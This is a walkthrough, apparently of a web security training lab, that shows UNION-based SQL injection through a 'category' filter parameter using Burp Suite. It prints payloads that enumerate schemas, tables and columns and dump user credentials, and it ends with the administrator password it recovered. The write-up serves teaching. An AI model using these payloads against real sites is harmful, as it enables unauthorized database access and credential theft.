---
custom_edit_url: null
sidebar_position: 5
---

<figure style={{ textAlign: 'center' }}>
![1](https://github.com/Knign/Write-ups/assets/110326359/17389135-4418-4ea2-ae39-a2090b538269)
</figure>

Let's filter for `Food & Drink`.

<figure style={{ textAlign: 'center' }}>
![2](https://github.com/Knign/Write-ups/assets/110326359/3acbeb53-dddc-4da4-91f5-2bc59f501bbe)
</figure>

Since we are proxying the traffic through Burp Suite, we can go to the `Proxy > HTTP History` tab to view this request.

<figure style={{ textAlign: 'center' }}>
![3](https://github.com/Knign/Write-ups/assets/110326359/9a966bb0-fc2d-4593-8ccb-664f1c73ba73)
</figure>

Let's forward the request to the `Repeater` for further modification.

Once in the `Repeater`, let's set the `category` parameter to the following:

```
' UNION SELECT 'test'--
```

<figure style={{ textAlign: 'center' }}>
![4](https://github.com/Knign/Write-ups/assets/110326359/d529e09b-f739-4dfb-8914-6262cc7eb519)
</figure>

Since the application returns an error, we know that the number of columns in the current query is more than 1.

Let's set the `category` parameter to the following:

```
' UNION SELECT 'test','test'--
```

<figure style={{ textAlign: 'center' }}>
![5](https://github.com/Knign/Write-ups/assets/110326359/702a663e-5d2c-4567-a099-603df0319b18)
</figure>

Now that we know the current query has two columns, we can start enumerating the databases.

```
' UNION SELECT schema_name, NULL FROM information_schema.schemata--
```

<figure style={{ textAlign: 'center' }}>
![20](https://github.com/Knign/Write-ups/assets/110326359/26eee849-a691-494f-a1cc-009f5efcaed9)
</figure>

Now let's enumerate the tables present in the `public` database by setting the `category` parameter to:

```
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='public'--
```

<figure style={{ textAlign: 'center' }}>
![21](https://github.com/Knign/Write-ups/assets/110326359/091474f0-7311-44ba-8c9f-167342b6df20)
</figure>

Next, we need to find the columns present in the `users_bfbtjz` table.

We can do that by setting the `category` parameter to the following:

```
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_bfbtjz'--
```

<figure style={{ textAlign: 'center' }}>
![22](https://github.com/Knign/Write-ups/assets/110326359/c7dde1ee-5cea-486e-a36a-93ab75ba18c2)
</figure>

We can now retrieve the usernames and password from the `username_ylkdae` and `password_sdbuqk` columns respectively.

For that we have to set the `category` parameter to the following:

```
' UNION SELECT username_ylkdae, password_sdbuqk FROM users_bfbtjz--
```

<figure style={{ textAlign: 'center' }}>
![23](https://github.com/Knign/Write-ups/assets/110326359/b0ac680b-6b39-409c-873e-8a87504d6d10)
</figure>

We can now login as the administrator using the following credentials:


| Username | Password |
| -------- | -------- |
| administrator         | x3lp8yt4oyymkeu9bppm         |

<figure style={{ textAlign: 'center' }}>
![9](https://github.com/Knign/Write-ups/assets/110326359/6381a1db-5933-4003-a0fd-2b0d2c04a375)
</figure>

We have solved the lab.

<figure style={{ textAlign: 'center' }}>
![10](https://github.com/Knign/Write-ups/assets/110326359/c37e5f54-5ea6-477b-9ed7-6ec71fabeb17)
</figure>
